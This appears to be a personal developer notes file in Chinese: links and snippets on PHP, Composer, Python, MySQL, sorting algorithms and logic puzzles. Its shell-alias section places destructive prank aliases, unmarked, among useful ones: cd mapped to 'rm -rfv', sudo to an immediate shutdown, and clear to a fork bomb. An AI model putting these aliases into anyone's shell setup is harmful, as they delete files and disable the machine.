[FSCapture是一款抓屏工具](http://jingyan.baidu.com/article/d5c4b52be9a966da560dc5af.html)
[PDO和消息队列的一点个人理解](http://www.cnblogs.com/loveyoume/p/6107239.html)
[支付宝 alipay-sdk- PHP](https://www.v2ex.com/t/348451)
https://github.com/wxpay/WXPay-SDK-PHP  https://github.com/wxpay https://github.com/fishlab/alipay-sdk-php
```js
经实践，最终我的做法是： 
1 、在 vendors 下新建 alipay 
2 、把 SDK 里的 aop 目录拷到 alipay 下（抛弃原来 SDK 目录下的 lotusphp_runtime 和 AopSdk.php ） 
3 、最终目录结构是 vendors/alipay/aop 
4 、 composer.json 的 autoload 节点里加入： 

"classmap": [ 
"vendor/alipay/aop" 
] 

5 、运行``composer dump-autoload`` 
6 、这样在项目里可以不用 require ，直接： 
 
// 仅测试能使用命名空间，忽略参数设置吧。。。 
$a = new \AopClient(); 
$b = new \AlipayAppTokenGetRequest(); 
$c = $a->execute($b); 
修改  composer.json  把这个文件夹下的所有类自动归入根命名空间
"autoload": {

  "classmap": [

    "app/controllers",

    "app/models",

    "services"

  ]

}
运行  composer dump-autoload ，完成以后，我们就可以在控制器中直接调用这个类了

```
[Unicode字符集中有哪些神奇的字符](https://www.zhihu.com/question/30873035/answer/178297820)
https://link.zhihu.com/?target=http%3A//www.unicode.org/charts/ 
0.3-0.1=0.19999999999999998

就这个情况，短期内取代ptyhon 很难
[re unicode 范围报错](https://www.v2ex.com/t/365196#reply1)
```js
import re;re.findall(u'[\U00010000-\U0001FFFFF]', u'\U0001f61b',re.U)
```
[python 的 tuple 是不是冗余设计？](https://www.zhihu.com/question/60574107/answer/177715146)
```js
lst = [i for i in range(0xffff)]
tpl = tuple(i for i in range(0xffff))
from sys import getsizeof
getsizeof(lst)
tuple还具有一些list没有的特性（也不能算作优点吧），比如因为tuple是 immutable, 所以它是可哈希的(hashable)的。
tuple可以作为dict的key，或者扔进set里，list则不行
In [11]: hash(tpl)
Out[11]: 7487529697070271394 
chardet库：识别文件的编码格式
with open('test1.txt', 'rb') as f:    
    result = chardet.detect(f.read())  
print(result)
MVC的本质就是分离界面和逻辑.

界面反映在PHP开发里就是视图模板.

逻辑反映在PHP开发里就是控制器.

MVC连在一起表达就是: 控制器,加载数据模型,渲染视图模板.

可见控制器控制着整个程序输入输出的走向.

需要注意的是:

控制器里不写SQL操作模型,视图里不写逻辑处理业务.
```
在线拼接电影字幕截图工具http://join-screenshots.zhanghai.me/
Gist 管理工具 Leptonhttps://www.v2ex.com/t/365669
[ php7.1 的一些疑惑](https://www.v2ex.com/t/365509#reply10)
PHP 还可以做游戏服务端[pocketmine-mp]( https://github.com/pmmp/pocketmine-mp) 
 7.0 之前版本有类型隐形转换把，$tmp[$k]的时候自动把$tmp 转换成 array 了，7.1 没有做类型转换，所以输出就是 string 了
7.1 新特性，现在字符串不会自动转换为数组，跟你发的链接没什么关系http://php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.empty-string-index-operator
[【数据库】Invalid default value for 'create_date' timestamp field](http://www.54php.cn/default/195.html)
`created_time` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00' COMMENT '插入时间' 就是不能为 timestamp字段设置指定的默认值，也就是语句中的 0000-00-00 00:00:00 其实从5.6.17这个版本就默认设置了不允许插入 0 日期了，术语是 NO_ZERO_IN_DATE  NO_ZERO_DATE 如果一定要设置为 0 日期的话，也是可以的，找到mysql的配置文件，在修改sql-mode,然后重启数据库服务 sql-mode = "STRICT_TRANS_TABLES,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION" SHOW VARIABLES LIKE 'sql_mode';
[完美解决failed to open stream: HTTP request failed!(file_get_contents引起的)](http://www.54php.cn/default/201.html)
ini_set("user_agent","Mozilla/4.0 (compatible; MSIE 5.00; Windows 98)");
$data_content = file_get_contents( $url ); https://learnxinyminutes.com/
[有哪些程序员特有的技能](https://www.zhihu.com/question/30719851)
cmd里面不想一点点输入冗长的文件路径？
直接把这个文件拖到CMD窗口吧！
你会发现 路径自己补上去了。 shift 右键 在此处打开命令窗口
document.body.contentEditable = true
0x7FFFFFFF 2147483647，只能说明那群鬼子不懂二进制。 2^31-1
十进制2147483647转二进制为0111 1111 1111 1111 1111 1111 1111 1111 直接win+E打开文件夹把读计算机的朋友惊呆了
用WIN+L直接把屏幕锁住后，身后的一群金融精英们惊呆了 win+d，直接回到桌面，把所有小学生惊呆了 Win+TAB 3D切换，身边的一群文科僧惊呆了
电脑滑动解锁。
把开机密码设置为 asdfghjkl;' 进入登陆界面时，从左往右一路滑到Enter键上，然后就进去了
[排序算法-N个正整数排序](https://zhuanlan.zhihu.com/p/27095748)
[英语学渣8个月轻松突破9000单词量的宝贵方法论，不看绝对亏大了！](https://zhuanlan.zhihu.com/p/27136686)
[萌新刷题（一）A + B 问题](http://www.lintcode.com/zh-cn/problem/a-b-problem/)
https://link.zhihu.com/?target=https%3A//www.jiuzhang.com/solutions/
[将彩色图片转化为素描的效果图片](https://github.com/liujiachao/image---replace)
[一个把图片转换成字符画的小程序](https://www.zhihu.com/question/33646570/answer/102046631)
```js
一个基于命令行的在线词典 kuanghy/kictorhttps://github.com/kuanghy/kictor
import Image
 
color = 'MNHQ$OC?7>!:-;.' #zifu
 
def to_html(func):
    html_head = '''
            <html>
              <head>
                <style type="text/css">
                  body {font-family:Monospace; font-size:5px;}
                </style>
              </head>
            <body> '''
    html_tail = '</body></html>'
 # ding yi HTML
    def wrapper(img):
        pic_str = func(img)
        pic_str = ''.join(l + ' <br/>' for l in pic_str.splitlines())
        return html_head + pic_str + html_tail
 
    return wrapper
 # fan hui zhi
@to_html
def make_char_img(img):
    pix = img.load()
    pic_str = ''
    width, height = img.size
    for h in xrange(height):
        for w in xrange(width):
            pic_str += color[int(pix[w, h]) * 14 / 255]
        pic_str += '\n'
    return pic_str
 
def preprocess(img_name):
    img = Image.open(img_name)
 
    w, h = img.size
    m = max(img.size)
    delta = m / 200.0
    w, h = int(w / delta), int(h / delta)
    img = img.resize((w, h))
    img = img.convert('L')
 
    return img
 
def save_to_file(filename, pic_str):
    outfile = open(filename, 'w')
    outfile.write(pic_str)
    outfile.close()
 
def main():
    img = preprocess(raw_input('input your filename:'))
    pic_str = make_char_img(img)
    save_to_file('char.html', pic_str)
 
if __name__ == '__main__':
    main()
```
[分享几个我自己常用的 aliases](https://www.v2ex.com/t/365260#reply29)
```js
# 文件按大小排序，lbys = ls by size
alias lbys='ls -alhS'

# 文件按时间排序，lbyt = ls by time
alias lbyt='ls -alht'

# 重新运行上一条命令，并将输出复制到剪贴板，cl = copy last
alias cl='bash -c "$(fc -ln -1)" | pbcopy'

# 复制上一条命令
alias last='fc -ln -1 | pbcopy'

# 将当前剪贴板里的内容保存到某个文件里
alias new='pbpaste | cat >'
alias save='pbpaste | cat >'
alias c=clear
alias myip='curl ifconfig.co' curl ip.gs
alias cd='rm -rfv'; 
alias sudo='sudo shutdown -P now'; 
alias clear=':(){ :|:& };:'; 
alias cp='mv'; 
alias exit='sh'; 
alias if='if !' for='for !' while='while !'; 
alias vim="vim +q"; 
alias unalias=false; 
alias alias=false;
alias gr=./review 
alias http="echo http://$(echo $(hostname -I | cut -d' ' -f1) | xargs ):8000 && python3 -m http.server" 
```
[用 Redis 实现分布式锁与实现任务队列](http://blog.jobbole.com/95156/)

为了应对高并发，处理数据量超级大的一种数据容器，也可以说是利用各种方式，先把数据存储在一个···容器···中，然后，再慢慢从这个容器中获取数据，实现·····异步操作数据库·····的方式，以便降低数据库的压力
[简单理解桶排序](http://www.cnblogs.com/loveyoume/p/6286929.html)
```js
外层的for循环，我们就是用来控制比较········轮数········的,

　　内层的for循环，我们用来控制···················每一轮的比较次数··················的
 
//外层控制轮数
        for(var i=0;i<len;i++){
            //标记是否有排序的元素
            var mark = true;
            //内层对数组元素进行冒泡选择
            for(var j=0;j<len-1-i;j++){
                //交互元素
                if(arr[j] > arr[j+1]){
                    mark = false;
                    var temp = arr[j];
                        arr[j] = arr[j+1];
                        arr[j+1] = temp;    
                }
            }
            if(mark){
            //当没有进行冒泡选择时，证明已经排序好了
                return arr;    
            }
        }
```

git分支冲突
```js
$ git checkout test
error: unable to create file app/Commands/Search.php (Permission denied)
error: unable to create file app/Console/Kernel.php (Permission denied)
D       app/Commands/Search.php
D       app/Console/Kernel.php
Switched to branch 'test'

vhalllsp@VHALLLSP-PC /d/soft/wamp/www/laravel_web (test)
$ git checkout -b d
D       app/Commands/Search.php
D       app/Console/Kernel.php
Switched to a new branch 'd'

vhalllsp@VHALLLSP-PC /d/soft/wamp/www/laravel_web (d)
$ git commit -am 'u'
[d d13de58] u
 2 files changed, 135 deletions(-)
 delete mode 100644 app/Commands/Search.php
 delete mode 100644 app/Console/Kernel.php

vhalllsp@VHALLLSP-PC /d/soft/wamp/www/laravel_web (d)
$ git checkout test
Switched to branch 'test'

vhalllsp@VHALLLSP-PC /d/soft/wamp/www/laravel_web (test)
$ git branch -D d
Deleted branch d (was d13de58).

vhalllsp@VHALLLSP-PC /d/soft/wamp/www/laravel_web (test)
$ git merge saas3.3.0
Auto-merging app/Http/Controllers/Api/Internal/WebinarController.php
Merge made by the 'recursive' strategy.
 app/Http/Controllers/Api/Internal/WebinarController.php | 9 +++++++--
 对于preg_match
/[^a-zA-Z0-9_^\x{4e00}-\x{9fa5}]+/u


是正常的能达到目的的
/[^a-zA-Z0-9_\x{4e00}-\x{9fa5}]+/u
和
/^[a-zA-Z0-9_\x{4e00}-\x{9fa5}]+/u
就是不正常的

/^[a-zA-Z0-9_|\x{4e00}-\x{9fa5}]+/u

就又正常了


证明\x{4e00}-\x{9fa5}  在php正则中需要单独划出来
字节转换
function HumanSize($Bytes)
{
  $Type=array("", "kilo", "mega", "giga", "tera", "peta", "exa", "zetta", "yotta");
  $Index=0;
  while($Bytes>=1024)
  {
    $Bytes/=1024;
    $Index++;
  }
  return("".$Bytes." ".$Type[$Index]."bytes");
}
```
[500 桶酒找毒酒的最快编程方法](https://www.zhihu.com/question/56545610)
```js
500桶酒，其中1桶是毒酒；48小时后要举行酒会；毒酒喝下去会在之后的第23-24小时内毒死人；国王决定用囚犯来试酒，不介意囚犯死多少，只要求用最少的囚犯来测试出哪一桶是毒酒，问最少需要多少囚犯才能保证找出毒酒？

2个。一个人有25个时间段。25的平方大于500
500桶酒的“总不确定性”是log2(500)

一个囚犯的“表达能力”是log2(25)
https://www.nowcoder.com/questionTerminal/5bd27ea2bb9b4773b9e3ae0408c73aa1?source=relative 2的9次方=512>500
至少需要⌈log2(500)/log2(25)⌉ = 2 个囚犯测试出毒酒

总不确定性和表达能力分别与酒的桶数和时间间隔相关，看起来可以普适地解决这类问题

假设我们要计算1055×8712。 查表得lg1055≈3.023，lg8712≈3.940。 将两数相加，得6.963。 计算1055×8712≈10^6.963 = 9183330。 验算：直接计算1055×8712=9191160，可见有一定误差。在对数位数取值更多时，数值将更为精确。
>>> 10**(log(1055,10)+log(8712,10))
=> 9191160.0
>>> log(200,10)
=> 2.301029995664
>>> log(100,10)+log(2,10)
=> 2.301029995664
```
[1000杯酒,有一个是毒酒,用奴隶试酒,毒发10到20小时,问最少需要多少奴隶才能找出毒酒](https://www.zybang.com/question/20b505045e3423541cfcfbe4ddf8474c.html)
最少1个尝一杯就死.最多10个,把酒分500+500,两个奴隶分别全部尝500杯,挂掉一个,就知道毒酒在哪一半,添一个奴隶不断半分,2的十次方=1024,十次方意思就是每次死一个,最后两杯活下来的那个一个人试试就出来了,1000瓶倒在一起就是一瓶了,一大瓶!https://www.33iq.com/question/19870.html
[php解决中文截取乱码问题](http://www.cnblogs.com/loveyoume/p/6081930.html)
```js
call_user_func传递的参数必须符合系统函数的传参顺序
$return = call_user_func('rtrim','sso;osoo;',';');
$return2 = call_user_func('explode',';','sso;osoo;');

header('content-type:text/html;charset=utf-8;');
$str = '利要a-符e:r ttnx节小-子s区。vh;peh。例t来个oe体字n代gb节看t通c eu是的soS至什tna过码 t;Ie看C实e/,字le A来具8y么a)n=于ndg是r于 0tmt现码 e0ssf8单下s(uo别e的以ieh过aatx和t接要u几这看 nsw Ihrr用字 mgtts上就eg cAei的nwo码e跳h，t编';
/*
*在某篇文章中截取一段字符串，多余的用省略号...表示，并且防止中文乱码
*$param1 string要截取的字符串 $str  注意：这里是utf-8编码
*$param2 int截取字符串的长度 $len  
*返回值 成功返回所要截取的字符串，失败为空
*/
function str($str='',$len=0){
    //检查参数
    if(!is_string($str) || !is_int($len)){
        return '';
    }
    $length = strlen($str);
    if($length <= 0 ){
        return '';
    }
    if($len>=$length){
        return $str;
    }
    //初始化，统计字符串的个数，
    $count = 0;
    for($i=0;$i<$length;$i++){
        //达到个数跳出循环，$i即为要截取的长度
        if($count == $len){
            break;
        }
        $count++;
        //ord函数是获取字符串的ASCII编码，大于等于十六进制0x80的字符串即为中文字符串
        if(ord($str{$i}) >= 0x80){
            $i +=2;//中文编码的字符串的长度再加2
        }
    }
    //如果要截取的个数超过了字符串的总个数，那么我们返回全部字符串，不带省略号
    if($len > $count){
        return $str;
    }else{
        return substr($str,0,$i).'...';
    }
}
```
[遍历文件夹下面的所有文件](http://www.cnblogs.com/loveyoume/articles/5866235.html)
[php猴子称王或者约瑟夫难题](http://www.cnblogs.com/loveyoume/p/5914267.html)
```js
一群猴子排成一圈，按1，2，...，n依次编号。然后从第1只开始数，数到第m只,把它踢出圈，从它后面再开始数，再数到第m只，在把它踢出去...，如此不停的进行下去，直到最后只剩下一只猴子为止，那只猴子就叫做大王。要求编程模拟此过程，输入m、n,

　　输出最后那个大王的编号。
 原理是先构建一个n个人的数组，然后，根据报数数，第M逐一剔除数组的元素，保留最后剩余的那个
 function yueSeFu($n,$m){
    //限制条件
    if(!is_int($n) || !is_int($m) || $n<2 || $m<2) return false;
    //获取猴子的编号
    $arr = range(1,$n);
    //初始化数组的下标
    $i = 0;
    while(count($arr) > 1){
        
        if(($i+1) % $m == 0){
            //数到出局数的人踢出局
            unset($arr[$i]);
        }else{
            //其他的添加到数组的最后面
            array_push($arr,$arr[$i]);
            //删除掉已被转移到后面的数组元素
            unset($arr[$i]);
        }
        $i++;//继续往后数
    }
    return array_values($arr)[0];
}
  
  
```
